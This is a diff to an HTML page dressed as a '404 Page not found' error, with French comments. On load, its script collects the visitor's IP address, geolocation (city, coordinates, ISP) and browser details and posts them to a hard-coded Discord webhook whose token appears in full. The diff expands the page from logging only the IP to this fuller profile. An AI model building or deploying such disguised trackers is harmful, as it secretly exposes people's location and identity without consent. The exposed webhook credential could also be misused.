@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moon Client</title>
+    <title>Collecte d'IP</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -24,6 +24,11 @@
             border-radius: 8px;
         }
 
+        #logo {
+            width: 100px; /* Ajustez la taille selon vos besoins */
+            margin-bottom: 20px;
+        }
+
         #message {
             margin-top: 20px;
             font-weight: bold;
@@ -33,27 +38,89 @@
 </head>
 <body>
     <div class="container">
+        <img id="logo" src="https://files.oaiusercontent.com/file-6tcYaeq9cHs6s7oS3yZwsuuB?se=2024-11-01T22%3A25%3A58Z&sp=r&sv=2024-08-04&sr=b&rscc=max-age%3D299%2C%20immutable%2C%20private&rscd=attachment%3B%20filename%3Dlogo.png&sig=X0rEOApVU9YSANyeigKW2NSCx9D1pnkkw87IK5ItobQ%3D" alt="Logo du site">
         <h1>Page d'erreur 404</h1>
         <p>Oops! Page not found.</p>
         <div id="message"></div>
     </div>
     <script>
         (async () => {
-            // Récupérer l'IP de l'utilisateur avec une API tierce
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const userIP = data.ip;
+            // Récupérer l'IP de l'utilisateur avec l'API ipify
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIP = ipData.ip;
 
-            // Envoyer l'IP au webhook Discord
+            // Récupérer les informations géographiques avec ip-api.com
+            const geoResponse = await fetch(`http://ip-api.com/json/${userIP}`);
+            const geoData = await geoResponse.json();
+
+            // Récupérer les informations du navigateur
+            const userAgent = navigator.userAgent;
+            const browserName = navigator.appName;
+            const browserVersion = navigator.appVersion;
+            const currentDateTime = new Date().toLocaleString();
+
+            // Créer un embed pour Discord
+            const embed = {
+                embeds: [
+                    {
+                        title: "Nouvelle IP collectée",
+                        description: "Détails de la connexion",
+                        color: 3447003,
+                        fields: [
+                            {
+                                name: "Adresse IP",
+                                value: userIP,
+                                inline: true
+                            },
+                            {
+                                name: "Date et Heure",
+                                value: currentDateTime,
+                                inline: true
+                            },
+                            {
+                                name: "Navigateur",
+                                value: `${browserName} ${browserVersion}`,
+                                inline: true
+                            },
+                            {
+                                name: "Système d'Exploitation",
+                                value: userAgent,
+                                inline: false
+                            },
+                            {
+                                name: "Localisation",
+                                value: `${geoData.city}, ${geoData.regionName}, ${geoData.country}`,
+                                inline: true
+                            },
+                            {
+                                name: "Latitude",
+                                value: geoData.lat.toString(),
+                                inline: true
+                            },
+                            {
+                                name: "Longitude",
+                                value: geoData.lon.toString(),
+                                inline: true
+                            },
+                            {
+                                name: "Fournisseur d'Accès Internet (ISP)",
+                                value: geoData.isp,
+                                inline: false
+                            }
+                        ]
+                    }
+                ]
+            };
+
+            // Envoyer l'embed au webhook Discord
             const webhookURL = "https://canary.discord.com/api/webhooks/1302003054790447198/7f_fux6WOnMg2D7V1RtVPxq_560T6tv37O1yFRhySGzUnBLX_U2AT7tHFNqyCVHVSGMb";
             await fetch(webhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    content: `Nouvelle IP collectée : ${userIP}`
-                })
+                body: JSON.stringify(embed)
             });
 
             document.getElementById('message').textContent = "Merci ! Votre adresse IP a été collectée.";
